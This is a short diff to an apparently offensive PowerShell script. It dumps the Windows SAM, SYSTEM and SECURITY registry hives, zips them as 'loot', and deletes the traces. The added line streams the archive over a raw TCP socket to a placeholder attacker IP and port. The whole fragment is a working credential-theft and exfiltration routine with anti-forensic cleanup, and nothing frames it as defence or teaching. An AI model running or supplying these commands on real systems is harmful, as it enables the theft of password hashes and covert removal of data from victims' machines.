@@ -28,6 +28,7 @@ reg.exe save hklm\sam C:\sam.save
 reg.exe save hklm\system C:\system.save
 reg.exe save hklm\security C:\security.save
 Compress-Archive -Path 'C:\sam.save', 'C:\system.save', 'C:\security.save' -DestinationPath 'C:\loot.zip'
+$fs=[IO.File]::OpenRead("C:\loot.zip");$c=New-Object Net.Sockets.TcpClient("#IP",#PORT);$s=$c.GetStream();$b=New-Object byte[] 8192;while(($r=$fs.Read($b,0,$b.Length))){$s.Write($b,0,$r)};$fs.Close();$s.Close();$c.Close()
 Remove-Item -Path C:\loot.zip
 Remove-Item -Path C:\sam.save
 Remove-Item -Path C:\system.save
